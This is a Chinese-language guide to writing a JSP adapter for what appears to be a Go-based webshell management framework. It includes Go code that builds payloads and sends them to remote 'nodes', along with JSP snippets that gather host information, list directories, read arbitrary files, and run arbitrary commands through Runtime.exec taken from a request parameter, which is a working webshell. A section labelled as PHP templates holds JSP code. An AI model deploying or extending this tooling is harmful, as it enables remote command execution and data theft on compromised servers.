
# 如何编写自定义适配器

## 目录

- [1. 适配器结构](#1-适配器结构)
- [2. 最小适配器示例](#2-最小适配器示例)
- [3. 专属 Operation](#3-专属-operation)
- [4. ClientFactory](#4-clientfactory)
- [5. 注册到 Manager](#5-注册到-manager)

---

## 1. 适配器结构

```
adapter/
└── jsp/                          # 你的适配器目录
    ├── adapter.go                # 主适配器（能力声明）
    ├── renderer.go               # 模板渲染（生成 JSP 代码）
    ├── operations.go             # 专属 Operation
    ├── client_factory.go         # Client 构造器
    └── capabilities.go           # 支持的能力列表
```

---

## 2. 最小适配器示例

```go
package jsp

import "github.com/Yliken/redbeanshellcore/core"

type Adapter struct{}

func New() *Adapter { return &Adapter{} }

func (a *Adapter) Capabilities() []core.Capability {
    return []core.Capability{
        core.CapInfo,
        core.CapExec,
        core.CapFileList,
        core.CapFileRead,
    }
}
```

---

## 3. 专属 Operation

核心：Build 阶段生成可执行代码，Parse 阶段结构化结果。

```go
// 模板
func renderJspInfo() string {
    return `<%
    String workdir = new java.io.File(".").getAbsolutePath();
    String os = System.getProperty("os.name") + " " + System.getProperty("os.version");
    String user = System.getProperty("user.name");
    out.print(workdir + "\t/\t" + os + "\t" + user);
    %>`
}

// Operation
type jspInfo struct{}

func NewJspInfo() *jspInfo { return &jspInfo{} }
func (o *jspInfo) Name() string { return "info" }

func (o *jspInfo) Build(ctx context.Context, sess *core.Session) (*core.Request, error) {
    req := core.NewRequest(o.Name())
    req.Payload = []byte(renderJspInfo())
    return req, nil
}

func (o *jspInfo) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
    parts := strings.Split(string(resp.Body), "\t")
    res := &core.InfoResult{BaseResult: core.NewBaseResult(o.Name(), resp.Body)}
    if len(parts) >= 4 {
        res.Workdir = parts[0]
        res.OS = parts[2]
        res.User = parts[3]
    }
    return res, nil
}
```

---

## 4. ClientFactory

```go
type ClientFactory struct{}

func NewClientFactory() *ClientFactory { return &ClientFactory{} }

func (f *ClientFactory) NewClient(ctx context.Context, rec *core.NodeRecord) (*core.Client, error) {
    tr := httpform.New(rec.Config.Endpoint)
    tr.Timeout = 30 * time.Second

    sess := &core.Session{
        NodeID:    rec.Config.ID,
        Endpoint:  rec.Config.Endpoint,
        Adapter:   rec.Config.Adapter,
        Metadata:  rec.Config.Metadata,
    }

    return core.NewClient(
        core.WithSession(sess),
        core.WithTransport(tr),
    ), nil
}
```

---

## 5. 注册到 Manager

方法一：使用默认 Factory + WrapOp：

```go
mgr := core.NewManager(registry, core.DefaultClientFactory())
```

方法二：指定自定义 Factory：

```go
mgr := core.NewManager(registry, jspadapter.NewClientFactory())
```

使用：

```go
client, _ := mgr.Client(ctx, "jsp-node")
res, _ := client.Do(ctx, jspadapter.NewJspInfo())
```

---

## 常见 PHP 模板片段

```jsp
<%-- 列目录 --%>
<%
String path = request.getParameter("path");
java.io.File dir = new java.io.File(path);
for (java.io.File f : dir.listFiles()) {
    out.print(f.getName() + (f.isDirectory() ? "/" : "") + "\t");
}
%>

<%-- 读文件 --%>
<%
String path = request.getParameter("path");
java.util.Scanner s = new java.util.Scanner(new java.io.File(path));
while (s.hasNextLine()) out.println(s.nextLine());
s.close();
%>

<%-- 执行命令 --%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
java.util.Scanner s = new java.util.Scanner(p.getInputStream());
while (s.hasNextLine()) out.println(s.nextLine());
s.close();
%>
```

---

## 注意事项

1. **二进制安全**：读取二进制文件时使用 `getInputStream()`，不要经过字符串转换
2. **字符编码**：统一 UTF-8，避免中文乱码
3. **转义**：参数值可能需要 URL 编码或 HTML 实体编码
